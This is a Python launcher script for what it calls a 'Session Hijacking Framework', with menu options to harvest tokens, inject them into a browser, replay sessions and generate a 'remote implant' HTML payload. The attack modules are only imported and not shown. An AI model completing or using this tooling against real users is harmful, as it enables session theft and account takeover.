#!/usr/bin/env python3
import time

BANNER = r'''
 __ __  ____  ____   ____    __  __  _ 
|  |  ||    ||    | /    |  /  ]|  |/ ]
|  |  | |  | |__  ||  o  | /  / |  ' / 
|  _  | |  | __|  ||     |/  /  |    \ 
|  |  | |  |/  |  ||  _  /   \_ |     \
|  |  | |  |\  `  ||  |  \     ||  .  |
|__|__||____|\____||__|__|\____||__|\_|
                                       
'''

MENU = '''
[1] Harvest Tokens
[2] Inject Token in Browser
[3] Replay Session (API Mode)
[4] Generate Remote Implant (HTML Payload)
[0] Exit
'''

def main():
    print(BANNER)
    time.sleep(1)
    print("Welcome to Session Hijacking Framework\n")
    while True:
        print(MENU)
        choice = input("Opsi Pilihan : ").strip()
        if choice == "1":
            import token_harvester
            token_harvester.run()
        elif choice == "2":
            import token_injector
            token_injector.run()
        elif choice == "3":
            import token_replayer
            token_replayer.run()
        elif choice == "4":
            from hijax_remote_implant import generate_payload
            generate_payload()
        elif choice == "0":
            print("bye bye friends 👋")
            break
        else:
            print("[!] Opsi tidak valid. coba ulangi lagi.")

if __name__ == "__main__":
    main()
